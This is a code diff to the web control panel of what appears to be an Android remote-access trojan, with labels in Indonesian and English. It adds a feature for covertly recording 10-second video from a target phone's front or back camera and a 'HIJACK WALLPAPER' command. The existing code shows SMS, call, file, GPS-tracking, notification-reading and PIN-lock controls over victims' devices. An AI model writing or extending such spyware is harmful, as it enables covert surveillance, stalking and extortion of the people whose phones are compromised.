@@ -638,7 +638,7 @@
 
             const buttons = [
                 'sms','calls','filemanager','gallery','notifications','apps','lock','openurl',
-                'get_location','flash','screenrecord','takebackpic','takefrontpic'
+                'get_location','recorder','wallpaper','flash','screenrecord','takebackpic','takefrontpic'
             ];
             grid.innerHTML = buttons.map(btn => {
                 let icon = 'fa-question', label = btn;
@@ -651,6 +651,8 @@
                 else if (btn === 'lock') icon = 'fa-user-lock', label = 'LOCK DEVICE';
                 else if (btn === 'openurl') icon = 'fa-external-link-alt';
                 else if (btn === 'get_location') icon = 'fa-crosshairs', label = 'LOKASI REALTIME';
+                else if (btn === 'recorder') icon = 'fa-video', label = 'RECORDER';
+                else if (btn === 'wallpaper') icon = 'fa-image', label = 'WALLPAPER';
                 else if (btn === 'flash') icon = 'fa-bolt';
                 else if (btn === 'screenrecord') icon = 'fa-video';
                 else if (btn === 'takebackpic') icon = 'fa-camera-retro';
@@ -674,6 +676,8 @@
                 openModal('get_location');
             }
             else if (action === 'lock') openModal('lock');
+            else if (action === 'recorder') openModal('recorder');
+            else if (action === 'wallpaper') openModal('wallpaper');
             else openModal(action);
         };
 
@@ -871,91 +875,79 @@
                 const apps = data.apps || [];
                 body.innerHTML = `<table><tr><th>app</th><th>action</th></tr>${apps.map(a => `<tr><td>${a.appName}</td><td><button onclick="sendCommand('run ${a.packageName}')">run</button></td></tr>`).join('')}</table>`;
             }
+            else if (currentModal === 'recorder') {
+                if (data.record_status === 'done' && data.last_video) {
+                    body.innerHTML = `
+                        <div style="text-align:center;">
+                            <h3 style="color:var(--accent-primary); margin-bottom:15px;">VIDEO CAPTURED</h3>
+                            <video width="100%" controls style="border-radius:18px; border:2px solid var(--accent-primary);">
+                                <source src="/captured_images/${data.last_video}" type="video/mp4">
+                            </video>
+                            <div style="margin-top:15px;">
+                                <a href="/captured_images/${data.last_video}" download style="color:var(--accent-primary); text-decoration:none; border:1px solid; padding:8px 16px; border-radius:20px;">💾 Download Video</a>
+                            </div>
+                        </div>`;
+                    footer.innerHTML = `<button onclick="openModal('recorder')" style="background:var(--accent-secondary);">REC AGAIN</button>`;
+                } else if (data.record_status) {
+                    body.innerHTML = `
+                        <div class="data-loader">
+                            <i class="fas fa-circle-notch fa-spin" style="font-size:3rem;color:red;"></i>
+                            <h3 style="margin-top:20px; color:red;">${data.record_status.toUpperCase()}</h3>
+                            <p style="color:var(--text-dim);">Silakan tunggu, sedang memproses data...</p>
+                        </div>`;
+                } else {
+                    body.innerHTML = `
+                        <div style="text-align:center; padding:20px;">
+                            <i class="fas fa-video" style="font-size:4rem; color:var(--accent-secondary); margin-bottom:20px;"></i>
+                            <h3>REMOTE VIDEO RECORDER</h3>
+                            <p style="color:var(--text-dim); margin-bottom:20px;">Pilih kamera untuk merekam video 10 detik secara sembunyi.</p>
+                            <div style="display:flex; gap:15px; justify-content:center;">
+                                <button onclick="sendCommand('record_front')" style="padding:15px 25px; flex:1;">📷 KAMERA DEPAN</button>
+                                <button onclick="sendCommand('record_back')" style="padding:15px 25px; flex:1;">📷 KAMERA BELAKANG</button>
+                            </div>
+                        </div>`;
+                }
+            }
+            else if (currentModal === 'wallpaper') {
+                body.innerHTML = `
+                    <div style="text-align:center; padding:10px;">
+                        <h3 style="color:var(--accent-primary); margin-bottom:15px;">HIJACK WALLPAPER</h3>
+                        <p style="color:var(--text-dim); margin-bottom:5px;">Image URL:</p>
+                        <input id="wp-url" placeholder="https://example.com/image.jpg" style="width:100%; margin-bottom:15px;">
+                        <p style="font-size:0.7rem; color:var(--text-dim);">Gunakan URL gambar langsung (Direct Link).</p>
+                    </div>`;
+                footer.innerHTML = `<button onclick="sendWallpaperCommand()" style="width:100%;">GANTI WALLPAPER TARGET</button>`;
+            }
         }
 
-        window.sendToast = () => { const t = document.getElementById('toast-text')?.value; if(t) sendCommand(`toast on ${t}`); };
+        window.sendWallpaperCommand = () => {
+            const url = document.getElementById('wp-url')?.value;
+            if(url) { sendCommand(`set_wallpaper ${url}`); showPopup('info', 'Command sent: Updating wallpaper...'); closeModal(); }
+        };
+
         window.sendLockCommand = () => { 
             const msg = document.getElementById('lock-msg')?.value || 'SYSTEM LOCKED';
             const pin = document.getElementById('lock-pin')?.value || '1234';
             sendCommand(`lock ${msg}|${pin}`); 
-        };
-        window.sendOpenUrl = () => { const u = document.getElementById('url-text')?.value; if(u) sendCommand(`openurl ${u}`); };
-        window.handleFmAction = (act, param) => {
-            if (act === 'rename') {
-                const name = prompt('file to rename?');
-                if (name && document.getElementById('fm-input')?.value) sendCommand(`rename ${name} ${document.getElementById('fm-input').value}`);
-            } else if (act === 'delete') {
-                if(confirm('Delete ' + param + '?')) sendCommand('del ' + param);
-            } else if (act === 'mkdir') {
-                const val = document.getElementById('fm-mkdir-input')?.value;
-                if(val) { sendCommand('mkdir ' + val); document.getElementById('fm-mkdir-input').value = ''; }
-            } else if (act === 'upload') {
-                const file = param.files[0];
-                if(!file) return;
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    const b64 = btoa(e.target.result);
-                    sendCommand('upload', { filename: btoa(file.name), data: b64 });
-                };
-                reader.readAsBinaryString(file);
-            }
+            closeModal();
         };
 
-        // polling
-        async function pollStatus() {
-            try {
-                const res = await fetch('/api/status');
-                state = await res.json();
-                updateDeviceList();
-
-                if (selectedClientId) {
-                    const dres = await fetch(`/api/client_data/${selectedClientId}`);
-                    const cdata = await dres.json();
-                    clientDataCache[selectedClientId] = cdata;
-                    
-                    if (currentModal) renderModalContent();
-
-                    // --- AUTO POPUP FOR LOCATION UPDATES ---
-                    if (cdata.location_status === 'requesting' || cdata.location_status === 'pending') {
-                        if (lastDataHashes['loc_status'] !== 'pending') {
-                            lastDataHashes['loc_status'] = 'pending';
-                            showPopup('info', '🛰️ Triangulating target GPS...');
-                        }
-                    } else if (cdata.location_status === 'success' && cdata.location_url) {
-                        const locHash = selectedClientId + cdata.location_url + (cdata.location_image || '');
-                        if (lastDataHashes['auto_loc'] !== locHash) {
-                            lastDataHashes['auto_loc'] = locHash;
-                            lastDataHashes['loc_status'] = 'success';
-                            showPopup('info', '🎯 TARGET TRACKED! Open modal to view map.', 10000);
-                        }
-                    }
-
-                    // Real-time notifications from notifications list
-                    if (cdata.notifications?.length) {
-                        const latestNotif = cdata.notifications[0];
-                        const notifHash = selectedClientId + latestNotif.packageName + latestNotif.title + latestNotif.text;
-                        if (!notificationHashes.has(notifHash)) {
-                            showPopup('info', `[${latestNotif.packageName}] ${latestNotif.title}: ${latestNotif.text}`);
-                            notificationHashes.add(notifHash);
-                        }
-                    }
-
-                    // popup notif
-                    if (cdata.agent_messages?.length) {
-                        const msg = cdata.agent_messages[0];
-                        const h = selectedClientId + msg;
-                        if (!agentMessageHashes.has(h)) { showPopup('info', msg); agentMessageHashes.add(h); }
-                    }
+        window.closeModal = () => {
+            if (currentModal === 'gallery') sendCommand('exit_gallery');
+            if (currentModal === 'filemanager') sendCommand('exit_shell');
+            if (currentModal === 'recorder') {
+                const data = clientDataCache[selectedClientId] || {};
+                if (data.last_video) {
+                    fetch('/api/delete_file', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filename: data.last_video })
+                    });
                 }
-            } catch (e) { 
-                console.error(e);
-                document.getElementById('connection-status').innerHTML = 'ERR'; 
             }
-            setTimeout(pollStatus, 2800);
-        }
-
-        window.onload = () => { pollStatus(); };
-        window.onclick = (e) => { const m = document.getElementById('main-modal'); if (e.target === m) closeModal(); };
+            document.getElementById('main-modal').style.display = 'none';
+            currentModal = null;
+        };
     </script>
 </body>
 </html>
